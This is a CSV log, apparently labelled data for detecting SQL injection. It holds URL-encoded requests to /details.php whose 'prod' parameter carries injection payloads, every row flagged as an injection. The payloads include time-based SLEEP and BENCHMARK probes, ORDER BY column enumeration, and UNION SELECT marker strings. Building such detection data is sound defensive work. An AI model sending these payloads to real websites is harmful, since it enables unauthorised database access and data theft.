full_url,event_time,hostname,injection
/details.php?prod=5%3BSELECT%20BENCHMARK%285000000%2CMD5%280x494e6e6a%29%29%23&type=%3F,1681395108.200088,192.168.43.6,1
/details.php?prod=5%3BSELECT%20BENCHMARK%285000000%2CMD5%280x734e4475%29%29&type=%3F,1681395108.254675,192.168.43.6,1
/details.php?prod=5%20AND%20%28SELECT%201875%20FROM%20%28SELECT%28SLEEP%285%29%29%29GZCk%29&type=%3F,1681395108.263182,192.168.43.6,1
/details.php?prod=5%20AND%20%28SELECT%201875%20FROM%20%28SELECT%28SLEEP%280%29%29%29GZCk%29&type=%3F,1681395113.272197,192.168.43.6,1
/details.php?prod=5%20AND%20%28SELECT%201875%20FROM%20%28SELECT%28SLEEP%285%29%29%29GZCk%29&type=%3F,1681395113.276668,192.168.43.6,1
/details.php?prod=5%20ORDER%20BY%201--%20-&type=%3F,1681395118.289277,192.168.43.6,1
/details.php?prod=5%20ORDER%20BY%206660--%20-&type=%3F,1681395118.293718,192.168.43.6,1
/details.php?prod=5%20ORDER%20BY%2010--%20-&type=%3F,1681395118.298958,192.168.43.6,1
/details.php?prod=5%20ORDER%20BY%206--%20-&type=%3F,1681395118.320209,192.168.43.6,1
/details.php?prod=5%20ORDER%20BY%204--%20-&type=%3F,1681395118.329546,192.168.43.6,1
/details.php?prod=5%20ORDER%20BY%205--%20-&type=%3F,1681395118.33392,192.168.43.6,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71717a6271%2C0x7a65756a6c4d7269496a54776f67674e4e6f7054706f524979494d6975756d63625369654c4e6574%2C0x717a626271%29%2CNULL%2CNULL%2CNULL--%20-&type=%3F,1681395118.343668,192.168.43.6,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x71717a6271%2C0x4e5273787954675343546b4543727167475466436568454f774178634e6b656b587573414479754f%2C0x717a626271%29%2CNULL%2CNULL--%20-&type=%3F,1681395118.349722,192.168.43.6,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x65785659765550636e75664874526749716346765a4f4f58446f796a4147707a67504e534a785373%2C0x717a626271%29%2CNULL--%20-&type=%3F,1681395118.362147,192.168.43.6,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x71717a6271%2C0x4e4b727650575a7174595159706e497572426862596642416175746345436b4873704f6f70544d6f%2C0x717a626271%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=%3F,1681395118.372366,192.168.43.6,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x63497454717a67716b757a47444d47536146724166727470544a766c47516b5a5173437659785974%2C0x717a626271%29--%20-&type=%3F,1681395118.377464,192.168.43.6,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71717a6271%2C0x6b536c724c784c794f51%2C0x717a626271%29%2CNULL%2CNULL%2CNULL--%20-&type=%3F,1681395118.411063,192.168.43.6,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x71717a6271%2C0x544277666a7353774f67%2C0x717a626271%29%2CNULL%2CNULL--%20-&type=%3F,1681395118.417501,192.168.43.6,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x7662684e736348437059%2C0x717a626271%29%2CNULL--%20-&type=%3F,1681395118.481401,192.168.43.6,1
